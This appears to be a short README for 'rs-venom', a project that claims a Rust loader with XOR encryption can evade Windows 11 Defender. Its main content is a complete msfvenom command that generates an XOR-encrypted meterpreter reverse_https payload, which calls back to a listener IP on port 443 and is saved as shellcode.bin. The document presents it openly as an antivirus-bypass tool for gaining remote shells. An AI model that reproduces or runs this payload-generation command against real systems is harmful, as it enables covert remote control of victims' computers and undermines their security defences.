# rs-venom

## This rust script paired with Xor encryption can bypass Windows 11 (Defender and all security turned on)

### MSFVenom command-line leveraging xor encryption

```cpp
msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.18.138 lport=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key "rust8" -f raw -o shellcode.bin

```
